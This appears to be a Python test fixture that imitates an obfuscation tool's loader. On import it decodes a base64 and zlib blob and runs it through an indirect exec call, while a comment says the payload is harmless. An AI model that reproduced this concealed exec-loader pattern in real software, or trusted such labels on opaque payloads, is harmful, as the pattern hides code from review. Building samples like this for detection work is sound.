"""Harmless fixture: PyObfuscate standard zlib + base64 loader."""

__obfuscated_by__ = 'https://pyobfuscate.com'

import base64
import zlib

# Payload contains harmless logic:
# print("Audited application initialized.")
# def calculate_metrics(values):
#     return sum(values) / len(values)
_payload = 'eJw1yDEKwzAMBdDdp/hbkqXdu/UkQcgKCBTFWFKhPX2njO+NqZ7r8q6uKR00hilT6uVQ11Qy/UlHFLNEHGX2fSxb63KAybiMUvZTcirH+iErie3VAGBK1nREnffjCRO/1f4Cxiv7'

getattr(__builtins__, 'exec')(zlib.decompress(base64.b64decode(_payload)))
